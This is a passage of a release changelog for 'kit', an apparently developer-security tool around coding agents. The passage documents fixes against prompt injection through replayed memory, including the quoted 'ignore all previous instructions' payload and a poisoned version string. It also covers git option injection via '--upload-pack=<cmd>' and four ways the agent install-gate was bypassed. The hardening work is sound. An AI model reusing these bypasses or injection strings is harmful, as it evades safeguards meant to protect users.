  two surfaces computed the overall ok/green verdict in two different places with
  two different rules — the MCP path used a naive `every(authenticated)`, reduced
  security to `pass||skip`, and ignored test-coverage entirely, so the SAME repo
  state could read green via MCP and red via `kit check` (a structurally guaranteed
  false-green/false-red between the two agent surfaces). Both now call one pure
  `computeCheckVerdict()` — scanner-health-strict security gating (`gateStatus`),
  the informational-service exemption, and test-coverage in a single source of
  truth. `kit_check`'s JSON now also includes per-dimension `dimensions` + `failed`
  and the `tests` results. A test pins that the shared rule holds. Deterministic,
  zero-LLM.

### Added

- **`kit memory stats` now surfaces recall adoption.** A new
  `~N recalls/active session (7d)` line (and `recalls.perActiveSession7d` /
  `recalls.activeSessions7d` in `--json`) shows whether agents actually follow the
  "run `kit memory search`" nudge — a near-zero rate (highlighted) means the loop
  has silently degraded to capture-only. Deterministic, computed from `query_log`
  vs sessions active in the last 7 days; no schema change.
- **`kit doctor` now detects a silently-removed memory capture loop.** If memory
  hooks were ever installed here (a durable marker under `~/.kit`) but a hook has
  since vanished from `~/.claude/settings.json`, `kit doctor` reports a **fail**
  ("memory capture is silently off") instead of the loop dying in silence — the
  worst failure mode. `memoryHooksLiveness()` is the deterministic check; the
  marker is written by `kit memory install` and cleared by `kit memory uninstall`
  (so a deliberate uninstall is never flagged).

### Security — memory as attack surface (the store is replayed into the prompt)

- **Recalled text is now sanitized AND flagged at every replay chokepoint (R2).**
  Previously only the SessionStart/PAL paths stripped hidden chars, and the biggest
  vector — `kit memory search`, which the agent is told to run "before answering
  anything project-specific" — replayed raw stored text with no data/instruction
  boundary. A transcript that echoed a hostile web page ("ignore all previous
  instructions …") rode verbatim into the next prompt. New single chokepoint
  `sanitizeForPrompt()` (strip hidden zero-width/bidi chars **and** flag
  high-confidence injection phrases) now guards `kit memory search`, the shared-tier
  render, the UserPromptSubmit nudge, and SessionStart recovery; SessionStart also
  wraps recalled items in an explicit "STORED DATA, not instructions" boundary and
  badges any flagged cell. kit flags — it never obeys — so a poisoned entry surfaces
  as suspect data instead of a silent directive. Deterministic, zero-LLM.
- **The shared memory tier is now Ed25519-signed on write and verifiable on read.**
  Entries in `.kit/shared/memory.jsonl` are committed and re-injected into every
  colleague's session as trusted "team decisions", so their integrity + provenance
  matter. `kit memory share` now signs each entry with the machine identity (adds a
  `kid` + `sig` over the canonical content) when one exists — no identity ⇒ unsigned
  (backward-compatible), and sharing never auto-creates a key. New `kit memory verify`
  reports each entry as `trusted` / `bad-sig` / `untrusted-signer` / `unsigned`.
  Trust mirrors the policy discipline: with a committed `.kit-policy.signers` anchor
  only those org keys are trusted (`--strict` exits non-zero on an un-anchored
  signer); with no anchor it verifies against this machine's own keys, so tampering
  (`bad-sig`) is always caught. Asymmetric, offline, zero-LLM.
- **The update-check version string can no longer carry a prompt-injection payload.**
  `latest` comes from the npm registry (or its on-disk cache) and is interpolated
  verbatim into the Claude Code hooks (`staleKitNotice`), yet `isNewer()` compared
  major versions first — so `"99.0.0 ignore all previous instructions"` passed
  (99 > 4) and rode into every prompt. `isNewer` now fails closed unless BOTH
  versions match strict semver (`isValidVersion`, exported + tested). A malformed
  version yields no notice instead of an injected instruction.
- **`kit memory scan --injection` — scan the store for prompt-injection patterns.**
  Because recall/decisions/PAL are replayed into the prompt, a poisoned entry is a
  delayed injection vector. New deterministic detector (`findInjection`): hidden
  zero-width / bidi-control chars and role-reprogram / instruction-override phrases
  are HIGH; dual-use shapes (pipe-to-shell, exfil imperatives, prompt-role refs) are
  HEURISTIC. Same shape + exit rule as the secret scan (exit 1 on a high-confidence
  finding); zero-LLM, masked previews, project-attributed.
- **Recalled text is defanged before re-injection.** The memory hooks now run
  recalled message text, decision titles, and PAL titles through `stripUnsafeChars`
  (removes zero-width + bidi-control chars) before building the prompt block, so a
  stored hidden payload can't ride recall back into the model. Visible text is
  untouched. Deterministic, fail-open.
- **Cross-machine `pull` scans the incoming store before merge.** `syncFromExport`
  now runs the injection scan on an incoming memory store and **fails closed** on a
  high-confidence finding (override: `KIT_MEMORY_ALLOW_UNSAFE=1`), so a poisoned
  store can't silently `merge` into yours and get replayed into the prompt. Fail-open
  only on a scan error (unknown/older schema) so legitimate foreign stores still merge.
- **New `docs/THREAT_MODEL.md` section: "Memory as an attack surface"** — documents
  the delayed prompt-injection surface and kit's deterministic defences (validated
  update boundary, defanged recall, `scan --injection`, guarded pull), with the
  honest limits (pull-based recall, same-UID writes, heuristic tier).

## [4.0.0] - 2026-07-02

### BREAKING — strict by default: green means every check actually ran

- **A check that could NOT run now FAILS the gate by default.** Previously a
  scanner that was not installed, had no token, or errored surfaced as a WARN and
  the gate passed — so an unscanned tree looked green. `kit check` / `kit ci` now
  treat a _did-not-run_ WARN as a failure by default: green means every check
  genuinely ran. Finding-WARNs (a check ran and flagged something) still stay
  WARN. Opt out per invocation with `--lenient` (or `KIT_CI_LENIENT=1`) to
  restore the old warn-and-pass behaviour; `--fail-on-warning` / `--strict`
  (or `KIT_CI_STRICT=1`) additionally fails on finding-WARNs.
  **Migration:** provision the toolchain (`kit setup` + `[scan.tooling]`
  vault-backed tokens, verify with `kit doctor`) so real scanners run, or pass
  `--lenient` where a scanner is legitimately unavailable. The single pure
  `gateStatus()` decides this for both `check` and `ci`.

### Added — `kit coverage --verify` binds AUTO controls to live results

- **AUTO no longer reads as "passing" without evidence.** `kit coverage --verify`
  gathers `checkSecurity()` + `runSelfAudit()` and binds each AUTO control to the
  ACTUAL latest status of its backing checks: `verified` (ran + passed),
  `failing` (ran + FAILED — the control is not covered), or `not-run` (nothing
  bound a pass/fail). Binding is conservative — an unproven control reads
  `not-run`, never verified — and a failing backing check flips its controls to
  FAILING so coverage can never silently show green while a scanner is red. The
  static map (no `--verify`) is unchanged and still carries the honesty
  disclaimer. `coverage.ts` stays pure; the CLI does the IO.

### Security — no false green in the self-audit itself

- **New self-audit rule R13 (`catch-false-green`).** Flags a `catch` block that
  returns a success shape (`available`/`ok`/`verified`/`passed: true`, or
  `status: "pass"`) without surfacing the error — the exact "swallow the failure,
  report success" pattern the release hunts. Opt out on a reviewed line with
  `// kit-self-audit: allow-catch-success`. Zero findings on kit's own tree.
- **Self-audit reports incomplete coverage instead of a false clean.** When source
  files can't be read, the walk is partial — a "clean" result is not
  authoritative. The walker now surfaces the unreadable paths (`console.warn`)
  and self-audit emits a WARN ("scanned an incomplete set") that fails under
  `--strict`, rather than passing green on a half-scanned tree.

## [3.3.0] - 2026-07-01

### Security — no false green (a deterministic self-audit found these in kit itself)

- **`kit audit verify` no longer passes when the audit log is missing.** A deleted
  or never-anchored log used to print a dim "no audit log" line and exit 0 — so an
  attacker erasing the tamper-evident trail SILENCED the alarm instead of tripping
  it. It now fails closed (exit 1) under `--strict`, `[governance.audit].require_anchor`,
  or when the machine has anchored logs elsewhere; a genuine fresh install gets a
  WARN, not a silent pass. An erased trail is a tamper signal.
- **Governance policy config is validated.** `[policy] default_mode` is now an enum
  and `[policy] agent_writes` a typed record, so a typo like `"read-onlyy"` or a
  wrong type ERRORS at load instead of silently failing the read-only gate (leaving
  the repo writable while the operator believed it was locked). `policy`/`mcp` added
  to KNOWN_SECTIONS (no more misleading "unknown section" warning for consumed config).
- **Publish + security CI fail closed on an unscanned tree.** `KIT_BUMBLEBEE_REQUIRED=1`
  is set on the supply-chain gate in `publish.yml` and `security.yml`, so a scanner
  that could not run (unavailable / timeout) BLOCKS instead of warn-and-passing an
  unscanned release as supply-chain-clean.

### Fixed — memory operations are now honest (never a silent no-op)

- **`kit memory push` never reports a false success.** The `command` transport (exit 0
  ≠ blob stored) is now marked unverified; the CLI + auto-push say "ran push command —
  UNVERIFIED, confirm it landed" instead of a green "pushed". The git transport, which
  proves durability, stays verified.
- **`kit memory install` won't clobber a corrupt `settings.json`.** An existing but
  unparseable settings file now throws (refusing to overwrite your other Claude Code
  settings) and `writeSettings` backs up to `.bak` before the first write.
- **Session-start pull / session-end push / index surface their outcome.** `tryAutoPull`
  notes "no blob yet" on a missing remote and "invalid sync.toml" on a bad config;
  `tryAutoPush` distinguishes verified / unverified / skipped; the detached SessionEnd
  worker (whose stderr is `/dev/null`) now persists failures to `~/.kit/session-end.log`
  instead of vanishing; mid-session-index rolls back its debounce marker on a spawn failure.
- **`kit memory pull/merge/sync` + `pal import`** print a neutral "nothing new" instead
  of a green success on a redundant/empty operation.
- **`kit memory index`** surfaces unreadable transcripts and files that parsed 0 messages
  from non-empty lines (corrupt / unrecognised format) instead of silently reporting 0.
- **`openMemoryDb`** warns when it cannot restrict `memory.db` permissions (secret-dense
  store possibly world-readable) instead of a bare `catch {}`.

## [3.2.0] - 2026-07-01

### Added

- **`sandstream-kit-plugin-sentrux` — architecture-decay findings.** A read-only
  scanner plugin (same shape as the Snyk / Wiz plugins) that ingests
  `sentrux check|gate --json` — an architecture health score (0–10000 from
  modularity / acyclicity / depth / equality / redundancy), the baseline gate,
  and rule violations — and appends them to `.kit-scan-results.jsonl` so
  `kit check --security` can gate on architectural regressions, an axis kit
  didn't previously cover. Tolerant parser (field-name variants degrade
  gracefully); a failed gate with no discrete violations still emits one finding
  so it never passes silently. Deterministic, zero-LLM, nothing leaves; the
  operator runs Sentrux in their env and opts the plugin in via `kitPlugins`.
- **`kit memory pal claim` — atomic take for parallel agents.** When several
  agents share a PAL (a durable device + ephemeral cloud sessions), two could
  both start the same open item. `pal claim <id>` flips it to `claimed` via an
  `UPDATE … WHERE status='open'` guard, so exactly one agent wins the race
  (`✓ claimed` vs a no-op) and the item drops out of everyone's open list;
  `claimed_by` records the winner (defaults to this device). `pal release <id>`
  returns an abandoned claim to `open`. Deterministic, zero-LLM, local; schema
  v6 (older rows have NULL claim fields — backward-compatible).
- **`kit memory learn` — surface instructions you keep re-typing.** Deterministically
  mines the local store for user messages repeated 3+ times (verbatim after casing /
  punctuation normalization), ranked by distinct sessions then count, with a
  `correction` flag for redirections ("no", "stop", "instead", "nej", "istället").
  These recurring asks are candidates for a memory rule — record them with
  `kit memory share` or in a rules file (CLAUDE.md / AGENTS.md) instead of re-typing.
  Zero-LLM, local, no ML — kit finds the pattern; you decide the rule. `--json`
  supported. Idea from headroom's `learn` (kit-research), done the kit way.

### Fixed

- **`kit memory search` no longer comes back empty for multi-term queries.** A
  query whose terms don't all co-occur in a single message used to match zero
  rows (the FTS5 expression joined terms by implicit AND). It now falls back to
  OR when the strict AND finds nothing, bm25-ranked so the message covering the
  most terms ranks first — relevance instead of all-or-nothing. Single-term
  lookups and exact multi-term matches are unchanged; still zero-LLM, local,
  no new deps. (#164)

## [3.1.0] - 2026-07-01

### Added

- **`kit agent-config` now wires GitHub Copilot** — the managed "use kit" rules
  block is written to `.github/copilot-instructions.md`, Copilot's canonical
  custom-instructions file (VS Code / Visual Studio). Detected when a `.vscode/`
  dir is present or the file already exists; `writeAgentConfig` creates the
  nested parent dir (`.github/`) as needed. Fifth rules-file target alongside
  CLAUDE.md / AGENTS.md / .cursorrules / .clinerules (Antigravity is already
  covered via its `AGENTS.md` support). Advisory only — memory indexing and a
  blocking install-gate for Copilot still need its transcript format + pre-tool
  hook surface verified against primary sources; the git-hook floor and the MCP
  server (`kit mcp`) apply to Copilot today regardless.
- **Memory sync blobs are now gzip-compressed before encryption (~3× smaller).** A
  SQLite store compresses well (a real store: 6.3 MB → 2.1 MB; large stores
  ~139 MB → ~30 MB), which keeps the blob under a git host's 100 MB file limit and
  speeds every transport. Compression happens INSIDE the encryption, so the remote
  still only ever sees ciphertext. Fully backward-compatible on read: an older,
  uncompressed blob decrypts to a raw SQLite file (no gzip header) and is passed
  through untouched — no new format version, works for both the passphrase and
  public-key modes. This is what makes a private **GitHub** repo viable as the
  ephemeral-session hub (alongside a self-hosted remote, which has no size cap).
- **Public-key memory sync — an ephemeral session can push with NO secret.** The
  passphrase mode (AES-256-GCM + scrypt) requires the _same secret on every
  machine that pushes_, which an ephemeral cloud session can't safely hold (no
  secret-store, no SSH key). New **asymmetric mode** flips it: `kit memory keygen`
  mints an X25519 keypair; the **public** recipient string (`kitmem-pub-…`, not a
  secret — safe in a setup script, env var, or the repo) goes in `[memory.sync]`
  as `recipient = "…"`, and push encrypts to it (`MAGIC_V3`: ephemeral X25519 →
  HKDF-SHA256 → AES-256-GCM, libsodium sealed-box shape, **zero new deps** — pure
  `node:crypto`). Only machines holding the **private** key (`~/.kit/memory-key.json`, 0600) can decrypt on pull. So an ephemeral session needs only a public key + a
  reachable private repo to contribute its memory — nothing secret leaves it, and
  `push_on_end`/`pull_on_start` work passphrase-free when a recipient is set.

- **External timestamp anchor (command transport) — closes the same-machine
  forge gap.** The keyless chain + machine-local HMAC anchor proves _what
  happened on this machine_, but anyone with that machine's anchor key (UID) can
  re-seal a rewritten log undetectably. `kit audit anchor --external` now folds
  an **external authority's receipt** into the seal: the documented
  `resolveExternalAnchor()` extension point is implemented via a command
  transport — set `KIT_EXTERNAL_ANCHOR_CMD` to any program (an RFC3161 TSA
  client, an append-only log writer, a notary) and kit pipes the tip/count/log
  path to it via `KIT_ANCHOR_TIP`/`KIT_ANCHOR_COUNT`/`KIT_ANCHOR_LOGPATH`,
  expecting a JSON receipt `{ token, authority?, timestamp? }` on stdout. The
  receipt is stored on the anchor record (`external`). kit still ships **no
  network client** (no-egress default) — the operator wires the authority.
- **`kit audit verify --require-external`** fails any seal that carries only an
  HMAC anchor (no external receipt), so a policy can demand third-party
  countersignature on every seal. Fail-closed throughout: `--external` with no
  command configured, a non-zero exit, non-JSON output, or a missing `token` all
  hard-error rather than silently degrading to HMAC-only.

### Fixed

- **PAL finding sync no longer device-blind — a real security blocker can't be
  silently cleared across devices.** The adversarial pass on the 3.0 surface
  found that `palSyncFindings` auto-closed findings purely by source-tag + scope,
  with **no `origin_device` predicate** — and because the finding id was derived
  only from `sourceTag + dedupKey` (repo-independent), the id was _identical_
  across machines on a shared/synced store. So a `kit check` on device B that
  didn't see device A's open finding would **permanently close A's blocker** (and
  two different repos that merely shared a directory _basename_ reconciled into
  each other's findings). The reconcile now (a) folds the scope into the id so
  different repos get distinct rows, (b) scopes findings by the **absolute**
  project root rather than its basename, and (c) **device-fences** the auto-close
  (`origin_device = thisDevice OR NULL`), so a scan only clears findings this
  device owns (legacy NULL-origin rows stay reconcilable by any device). A
  genuinely-cleared finding now lingers until the owning device re-scans —
  fail-safe (a stale reminder, never a dropped blocker).

### Security

- **Device identity is now an unguessable persisted token, not a hostname hash.**
  `deviceId()` previously derived the per-device id from `sha256(hostname+user)`
  — guessable by any peer on a shared store (enabling cross-device
  surface/suppression of PAL items) and unstable across hostname churn (a DHCP
  lease or machine rename would silently orphan a device's own items). It now
  prefers a random id persisted once to `<memoryDir>/device-id` (0600), and
  validates the `KIT_DEVICE_ID` override against `[A-Za-z0-9_-]{1,64}` (a
  malformed value is ignored rather than trusted). The hostname hash remains only
  as a last-resort fallback when the id file can't be written.
- **Memory-sync git transport hardened against option injection.** The
  `remote`/`branch` from `~/.kit/sync.toml` are passed to `git` as positional
  argv (no shell — OS metacharacters were already inert), but a value starting
  with `-` is parsed as an _option_ (a `remote` of `--upload-pack=<cmd>` turns
  `git clone` into command execution) and `ext::`/`fd::` remote helpers run
  commands by design. `loadSyncConfig` now rejects both, call sites pass
  `--end-of-options` before positional operands, and `git` runs with
  `protocol.ext`/`protocol.fd` disabled. (Config is operator-owned, so this is
  defense-in-depth — and future-proofs any `sync init` that ingests a remote.)
- **The `transport = "command"` child no longer inherits kit secrets.** It moves
  only the already-encrypted blob, so it never needs `KIT_MEMORY_PASSPHRASE` —
  yet the whole `process.env` (passphrase included) was handed to it, so a
  transport that logged its environment (`aws --debug`, a `set -x` shell) would
  spill the passphrase right next to the ciphertext it protects. The child env is
  now stripped of every kit-managed passphrase/secret/token/key; the operator's
  own provider credentials still pass through.

## [3.0.0] - 2026-06-30

kit 3.0 — from a provable local floor to an org-governed control plane: machine
**identity** (Ed25519) + **signable, distributable policy-as-code**, **governed
cross-device memory** (encrypted sync + device-coupled action items),
**attribution-bound tamper-evident audit**, a hardened install/scan gate, and a
deterministic, zero-LLM "smart" UX (contextual hints + a discoverable knobs
reference). Everything below is **additive over 2.x** — no stable command was
removed or downgraded (enforced by the public-surface invariant).

### Security

- **Audit attribution is now bound into the HMAC anchor (de-attribution of a
  sealed entry is caught).** The adversarial pass found that a writer-only
  attacker — no private key, no anchor key — could **strip or rewrite the
  `kid`/`sig` of an entry that was already signed AND anchored**, and every layer
  stayed green: the keyless chain re-hashes without those fields, the signature
  tally just re-counts the entry as `unsigned` (fail-open), and the hash-only
  anchor tip was byte-identical. The anchor seal now folds attribution
  (`computeAnchorTipV3` over `hash | kid | sig` per line; anchor record
  `version: 3`), so altering or removing the signer of any **anchored** entry
  changes the tip → hard `tip-mismatch`; forging a `kid`/`sig` onto a sealed
  keyless entry is caught the same way. Backward-compatible: legacy `version ≤ 2`
  records keep verifying hash-only until the next `kit audit anchor` re-seals them
  as v3. (Surfaced by the deep adversarial security pass; complements #175.)

### Added

- **`kit memory install` now wires the Claude Code status line too — the setup
  score + open-PAL (`⚠`) count become visible in your terminal.** Previously PAL
  only reached the agent (via the hook); the human never saw it unless they
  hand-edited `settings.json`. Install now also sets `statusLine` to `kit
statusline` — idempotent, and it **never clobbers a custom statusLine** (reports
  it and leaves it as-is). `--no-statusline` skips it; `kit memory uninstall`
  removes only kit's own. (Paired with the device-coupled PAL count, so what you
  see in the bar is this device's real "blocked-on-you".)
- **PAL is device-coupled — an ephemeral session's action items no longer nag your
  durable device.** Pending-action items are now stamped at creation with an
  `origin_device` (stable per machine; an ephemeral container gets its own
  throwaway id) and an `origin_root` (the absolute project path). Reminders, the
  `kit statusline` count, and `kit memory pal list` surface **only this device's
  items** by default (legacy NULL-origin rows still show) — so a "blocked-on-you"
  created in a throwaway container/scratch dir doesn't follow you across the gap-#4
  memory sync. `kit memory pal list --all` shows every device; **`kit memory pal
prune`** closes this device's open items whose origin directory no longer exists
  (dead ephemeral/scratch dirs). Schema v5; backward-compatible (pre-v5 rows have
  no origin and are left untouched by prune).
- **`kit config knobs` — a discoverable reference for the power-user env vars +
  `.kit.toml` fields kit honors.** A review found capabilities like air-gapped
  SAST (`KIT_SEMGREP_CONFIG`), capture-time secret redaction (`KIT_MEMORY_REDACT`),
  read-only lockdown (`[policy].default_mode`), monorepo triage whitelisting
  (`[supply_chain].internal_scopes`) and the CI escape hatches (`KIT_ELEVATED`,
  `KIT_PROD_OK`, `KIT_NON_INTERACTIVE`) were only findable in source. `kit config
knobs` lists them grouped, with `env`/`cfg` tags and a ⚠ on the ones that bypass
  a safety gate (`--json` for tooling). Listed in `kit config` help + the main
  command list. (Companion to the deterministic hint engine.)
- **Smart, deterministic hints — kit surfaces the right opt-in capability at the
  right moment (zero LLM).** A review found many powerful features (signed policy,
  audit anchoring, container/IaC scanning, malware heuristics) were only
  discoverable by reading source. A tiny rule engine (`src/hints.ts`) emits one
  short, actionable tip from plain state checks — e.g. _"your audit log isn't
  anchored — run `kit audit anchor`"_, _"your `.kit-policy.toml` is unsigned — run
  `kit policy sign`"_, _"you have a Dockerfile but trivy isn't installed"_,
  _"malware heuristics are off — enable GuardDog"_, _"you have an identity but no
  org policy"_. Shown as a `💡 tip:` line after `kit check` and at session start.
  Each tip shows **at most once** (a `~/.kit/.hint-*` marker suppresses it),
  detectors are fail-soft (a tip never breaks a check or a session), and
  `KIT_NO_HINTS=1` silences them all.
- **Private cross-device memory sync over your own git remote (`kit memory push`
  / `kit memory pull`).** Memory design gap #4: the personal store
  (`~/.kit/memory.db`) is per-machine; this wires the existing encrypted-backup +
  `mergeDb` primitives to an opt-in transport — YOUR private git repo — so one
  machine `push`es and another `pull`s (last-write-wins), no manual file copy.
  Configurable without being a backdoor, by construction: (1) config is read ONLY
  from `~/.kit/sync.toml` (a LOCAL file), never the project tree, so a malicious
  committed `.kit.toml`/`.kit/*` in a cloned repo can't redirect your memory; (2)
  the sync remote MUST differ from the project's `origin` (anti-exfil guard) — your
  secret-dense brain can't be pushed into the project repo; (3) the payload is
  AES-256-GCM encrypted (the remote sees only ciphertext; passphrase via
  `KIT_MEMORY_PASSPHRASE`, never stored); (4) fully opt-in — no config, no sync.
  Zero new dependencies (git + `node:crypto`).
- **Memory sync: a `transport = "command"` option for non-git stores
  (S3/rclone/scp/USB).** You're not locked into a git remote — set
  `transport = "command"` in `~/.kit/sync.toml` with `push_cmd`/`pull_cmd`, and kit
  runs your command with the encrypted blob path exposed as `$KIT_MEMORY_BLOB`
  (e.g. `aws s3 cp "$KIT_MEMORY_BLOB" s3://…`, `scp`, `rclone`). Same guards
  apply: the command is read only from the LOCAL `~/.kit/sync.toml` (never the
  project tree, so a cloned repo can't inject it), the payload is encrypted, and
  it's opt-in. The blob is the real unit; git and command are just two ways to
  move it.
- **Memory sync onboarding: `kit memory sync init` + opt-in auto-pull/push + a
  one-time nudge.** Closes the usability gaps in gap #4 (you previously had to
  hand-write `~/.kit/sync.toml`, and nothing synced automatically):
  - `kit memory sync init` writes the local `~/.kit/sync.toml` template
    (`--remote <url>` for git, or `--command` with `--push-cmd`/`--pull-cmd`;
    `--auto` enables the hooks; `--force` overwrites). It won't clobber an existing
    config and reminds you to set `KIT_MEMORY_PASSPHRASE` + create the private repo.
  - `[memory.sync] pull_on_start = true` / `push_on_end = true` wire sync into the
    SessionStart/SessionEnd hooks: pull+merge before "where you left off", and
    index+push when the session ends — the missing piece for **ephemeral
    containers** (memory reaches your durable store before the box is reclaimed).
    Both are fail-soft: a session is never blocked by sync.
  - A one-time tip suggests `kit memory sync init` when you have a non-trivial
    memory store but sync isn't configured yet (suppressed after the first show).

### Security

- **Install-gate: closed four bypasses that let an untriaged install through.** A
  deep adversarial pass found the `PreToolUse` install-gate's command parser could
  be defeated by (1) a leading env-var assignment — `A=1 npm i evil` tokenized so
  no matcher fired; (2) package runners it didn't know — `npm exec` / `pnpm dlx` /
  `yarn dlx` / `bun x`; (3) a remote tarball URL — `npm install https://…/x.tgz`
  was dropped as a "local" target on its extension alone; and (4) an install hidden
  in a subshell or `-c` arg — `sh -c '…'`, `$(…)`, backticks. The parser now strips
  leading wrapper bins + `VAR=value` assignments, matches the runners, treats any
  `scheme://` target as remote (→ fail-closed `unverifiable`), and recursively scans
  nested commands. A regression test pins each bypass.
- **ReDoS: the GCP private-key redaction pattern no longer hangs on a small hostile
  input.** `"private_key"` was matched with two unbounded runs around a literal, so
  a blob of near-miss `-----END ` tokens backtracked catastrophically (~18 KB hung
  ~17 s) — a CPU DoS of the gate reachable via `scan-staged`, `kit memory scan`, and
  status redaction. The body is now a single bounded `[^"]{1,8000}` run ending at the
  close quote (linear; still matches real keys).
- **ReDoS: `globToRegExp` (memory clusters) collapses stacked wildcards.** A
  malicious committed `.kit/shared/clusters.json` glob of many `**`/`**/` compiled to
  adjacent `.*`/`(?:.*/)?` groups that backtracked catastrophically — and the cluster
  map is matched on every `UserPromptSubmit`, so a pulled branch could hang the agent
  on each prompt. Consecutive wildcard runs now coalesce to a single non-stacking
  group and an over-long glob is refused (matches nothing).
- **Policy trust anchor: canonical signing bytes now cover every key faithfully.**
  `sortDeep` rebuilt objects with `out[k] = …`, so a `__proto__` key was a prototype
  write that silently dropped the key+subtree — letting a `[__proto__]` table be
  appended to a SIGNED `.kit-policy.toml` without changing its signature/fingerprint
  ("signed bytes ≠ document"). It now assigns via `defineProperty` (the key is a real
  own property in the bytes), refuses a TOML **date** value (no faithful canonical
  form → a Date≡string collision), `validatePolicy` rejects `__proto__`/`constructor`/
  `prototype` keys, `verifyPolicy` treats an uncanonicalizable doc as `invalid` instead
  of crashing, and `versionGte` is guarded against a non-string. No global prototype
  pollution existed (Node `JSON.parse`/`smol-toml` create an own property); this hardens
  canonicalization soundness.

### Fixed

- **Air-gap completeness: the update check no longer egresses by default under
  `KIT_AIRGAP`.** `checkForUpdate` (the one outbound call on a normal `kit` run)
  now short-circuits when air-gap is set, alongside the existing CI/`KIT_NO_UPDATE_CHECK`
  suppressors — so "no outbound network by default / air-gap mode" is a complete
  posture, not one with a lone npm-registry beacon. (Surfaced by the 3.0 promise audit.)
- **Deterministic gate: bumblebee catalog-staleness no longer flips the verdict on
  wall-clock time.** A clean supply-chain scan whose threat-intel catalogs are >60
  days old was a `warn` (failing `kit ci --strict`) purely because the calendar
  advanced — same repo, same scanners, different verdict by date. Staleness is now
  ADVISORY (`status: pass`, noted in the detail/suggestion); the gate verdict is a
  function of inputs only. (Surfaced by the 3.0 promise audit.)
- **Secrets: entropy backstop closes a fail-closed shared-memory scan hole.** The
  `kv-secret` heuristic allowlists runtime env prefixes (`KIT_`/`GITHUB_`/…), so a
  real high-entropy credential stored under such a prefix slipped past the
  fail-closed `kit memory share` gate. `findSecrets(text, { entropyBackstop })` now
  also flags an ALL-CAPS `KEY=value` whose value is long + genuinely high-entropy
  (Shannon ≥ 4.2 bits/char) regardless of prefix; `shareEntry` enables it. Catches
  base64/base62 secrets while clearing hex hashes (~4.0) and dictionary values; the
  noisier code/diff scan is unchanged. (Surfaced by the 3.0 promise audit.)

### Changed

- **Frozen contracts: "additive-only" is now test-enforced, not just review
  discipline.** A new invariant test checks the live surface against the committed
  `contracts/public-surface.json` baseline and FAILS on a removed stable command, a
  `stable → experimental/deprecated` downgrade, or a `schemaVersion`/adapter-sdk
  **major** regression — closing the gap where a breaking change could be hidden by
  regenerating the byte-for-byte snapshot. (Surfaced by the 3.0 promise audit.)

### Added

- **Org-distributed policy verification** (`kit policy trust`) — 3.0 Phase 2
  starter. A committed `.kit-policy.signers` trust anchor lists the org public
  key(s) allowed to sign the policy; `verifyPolicy` resolves the signer in trust
  order (a pinned `--key` → this machine's identity → the org anchor), so ONE
  policy signed by a central org key verifies authentically on every clone — no
  shared secret, only public keys distributed. `kit policy trust <pubkey.pem>
[--label]` / `--list` / `--remove <id>` manage it. Fail-CLOSED once an anchor
  exists: a signer that isn't in it fails `kit policy check` / `kit ci` (same
  discipline as the HMAC audit anchor), not just a warn. New `src/policy-trust.ts`;
  `PolicyVerifyResult` gains `via` (key|local|org) + `anchored`. This is the model
  the major bump needs — identity signs the org standard, any repo verifies it.
- **`kit ci` enforces the signed policy.** `kit ci` now folds `evaluatePolicy`
  into its gate: a present `.kit-policy.toml`'s requirements appear as `policy/*`
  checks in the report (text/GitHub/JSON), so a tampered/revoked signature, unmet
  `min_kit_version`, or (under `--strict`) a missing required scanner fails CI like
  any other check. Opt-in and backward-compatible — no policy ⇒ no `policy/*`
  checks ⇒ the verdict is unchanged. Completes Phase 1's "kit ci consumes the
  policy".
- **`kit policy check`** (experimental) — enforce the signed `.kit-policy.toml`
  against this machine's deterministic state (3.0 Phase 1, part 2). Verifies the
  signature (the trust anchor: warn on unsigned/unknown signer, **fail** on
  tamper or a revoked signer), then evaluates `min_kit_version` (current ≥
  required), `required_scanners` (resolvable mise-first; warn, or **fail** under
  `--strict`), and `prod_writes_need_approval` (`.kit.toml [governance.approval]`).
  `require_triage`/`thresholds` are surfaced (enforced by the install-gate /
  data-source plugins, not duplicated). Opt-in: no policy ⇒ no-op. `--json` +
  exit code for CI. New `evaluatePolicy`/`versionGte` and a shared `verifyPolicy`
  core (reused by `kit policy verify`). See `docs/POLICY.md`.
- **`kit policy`** (experimental) — signable, distributable policy-as-code (3.0
  Phase 1). A separate `.kit-policy.toml` document holds the org **standard**
  (`require_triage`, `required_scanners`, `prod_writes_need_approval`,
  `min_kit_version`, `[thresholds]`); `kit policy init/show/validate/sign/verify`.
  Signing ties the standard to a `kit identity` (Phase 0) over **canonical JSON**
  (key-sorted), so the signature survives TOML reformatting/comments and breaks
  only on a real policy change; `verify` checks against locally-known keys (or a
  pinned `--key`), fail-opens on an unknown signer, and fails on a tampered doc or
  a revoked signer. Separate from the 2.x `.kit.toml [policy.agent_writes]`
  pre-approval — this is the org-level standard. Enforcement glue (`kit check`/`ci`
  consuming it) + signed org bundles + RBAC are the follow-ups. See `docs/POLICY.md`.
- **Zero-touch environment fueling guide** (`docs/ENV_FUELING.md`). Documents the
  setup-script pattern — `kit setup --recommended` (config: tools, vault-backed
  secrets, agent gates, verify) + `kit memory sync`/`restore` (recall) — so a fresh
  or ephemeral environment (cloud container, Claude Code on the web, CI, new
  laptop) fuels itself with no manual steps. Covers non-interactive setup, where
  the script lives (devcontainer/Dockerfile/CI/web), the memory bridge, and the
  guardrails (secrets never plaintext, private memory never committed, idempotent,
  zero-LLM). Linked from the README quick start.
- **Path→cluster push-surfacing for shared decisions** (`kit memory context`).
  Pull recall can't _guarantee_ you see a settled decision (a bad query misses
  it); the guardrail is now PUSH — touch files under an area and kit
  deterministically surfaces that area's ACTIVE decisions. A committed
  `.kit/shared/clusters.json` maps `area → globs` (zero-dep glob→regex matcher).
  `kit memory context [paths…|--changed]` prints the active decisions for the
  touched areas, and the UserPromptSubmit reminder now appends a bounded notice
  for the area(s) your working-tree changes fall into. Superseded/reversed
  decisions never resurface (uses `activeShared`). Fail-open (no map ⇒ nothing).
- **`kit panic`** (experimental) — one-command compromise response (the control
  plane's kill-switch). Rotates the local identity (old key archived but its past
  signatures stay verifiable), emits a SIGNED, append-only revocation of the old
  key (`~/.kit/revocations.jsonl`, signed by the new key — asymmetric, so it
  propagates as public data with no shared secret), records an `identity.panic`
  event in the tamper-evident audit log, and prints the platform-revocation
  checklist for the accounts kit does NOT own (GitHub / Anthropic / Apple / vault)
  with links. `kit audit verify` now surfaces entries signed by a revoked key
  (valid as history; the key is no longer trusted for new signatures). New
  identity primitives: `recordRevocation`, `loadRevocations`, `isRevoked`,
  `revocationStatement`. Honest boundary documented: kit owns its keys + the
  revocation list + the audit; it only orchestrates platform-account revocation.
- **Living shared decisions — lifecycle (status / supersedes / reverses).**
